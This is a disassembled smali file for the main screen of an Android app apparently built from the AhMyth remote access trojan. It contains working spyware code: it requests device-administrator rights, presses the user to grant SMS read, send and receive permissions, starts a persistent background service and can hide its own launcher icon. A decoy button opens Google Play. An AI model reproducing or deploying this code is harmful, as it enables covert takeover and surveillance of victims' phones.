.class public Lahmyth/mine/king/ahmyth/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field componentName:Landroid/content/ComponentName;

.field devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field sharedPreferences:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 27
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public fn_hideicon()V
    .locals 4

    .line 100
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v1

    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 103
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 7
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 35
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 36
    const/high16 v0, 0x7f070000

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->setContentView(I)V

    .line 38
    new-instance v0, Landroid/content/ComponentName;

    const-class v1, Lahmyth/mine/king/ahmyth/AdminReceiver;

    invoke-direct {v0, p0, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    .line 39
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iput-object v0, p0, Lahmyth/mine/king/ahmyth/MainActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 41
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    .line 45
    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 46
    .local v0, "intent":Landroid/content/Intent;
    iget-object v1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 47
    const v1, 0x7f090001

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "android.app.extra.ADD_EXPLANATION"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 48
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 51
    .end local v0    # "intent":Landroid/content/Intent;
    :goto_0
    nop

    .line 52
    const-string v0, "android.permission.READ_SMS"

    invoke-static {p0, v0}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_1

    .line 53
    const-string v0, "android.permission.SEND_SMS"

    invoke-static {p0, v0}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_1

    .line 54
    const-string v0, "android.permission.RECEIVE_SMS"

    invoke-static {p0, v0}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_1

    .line 56
    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 57
    .local v0, "mIntent":Landroid/content/Intent;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "package:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 58
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 59
    const-string v2, "Grant all permission before!"

    invoke-static {p0, v2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 62
    .end local v0    # "mIntent":Landroid/content/Intent;
    :cond_1
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lahmyth/mine/king/ahmyth/MainService;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 63
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-static {p0, v0}, Landroid/support/v4/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

    .line 69
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1c

    if-gt v2, v3, :cond_3

    .line 71
    const v2, 0x7f050017

    invoke-virtual {p0, v2}, Lahmyth/mine/king/ahmyth/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/Switch;

    .line 72
    .local v2, "hide_icon_switch":Landroid/widget/Switch;
    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/widget/Switch;->setVisibility(I)V

    .line 74
    const-string v4, "AppSettings"

    invoke-virtual {p0, v4, v3}, Lahmyth/mine/king/ahmyth/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    iput-object v4, p0, Lahmyth/mine/king/ahmyth/MainActivity;->sharedPreferences:Landroid/content/SharedPreferences;

    .line 75
    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    .line 77
    .local v4, "appSettingEditor":Landroid/content/SharedPreferences$Editor;
    new-instance v5, Lahmyth/mine/king/ahmyth/MainActivity$1;

    invoke-direct {v5, p0, v4}, Lahmyth/mine/king/ahmyth/MainActivity$1;-><init>(Lahmyth/mine/king/ahmyth/MainActivity;Landroid/content/SharedPreferences$Editor;)V

    invoke-virtual {v2, v5}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    .line 86
    iget-object v5, p0, Lahmyth/mine/king/ahmyth/MainActivity;->sharedPreferences:Landroid/content/SharedPreferences;

    const-string v6, "hidden_status"

    invoke-interface {v5, v6, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    .line 88
    .local v5, "icon_hidden_status":Z
    if-eqz v5, :cond_2

    .line 89
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->fn_hideicon()V

    .line 90
    invoke-virtual {v2, v1}, Landroid/widget/Switch;->setChecked(Z)V

    goto :goto_1

    .line 93
    :cond_2
    invoke-virtual {v2, v3}, Landroid/widget/Switch;->setChecked(Z)V

    .line 96
    .end local v2    # "hide_icon_switch":Landroid/widget/Switch;
    .end local v4    # "appSettingEditor":Landroid/content/SharedPreferences$Editor;
    .end local v5    # "icon_hidden_status":Z
    :cond_3
    :goto_1
    return-void
.end method

.method public openGooglePlay(Landroid/view/View;)V
    .locals 3
    .param p1, "view"    # Landroid/view/View;

    .line 108
    new-instance v0, Landroid/content/Intent;

    const-string v1, "https://play.google.com/store/apps"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 109
    .local v0, "GoogleIntent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 110
    return-void
.end method
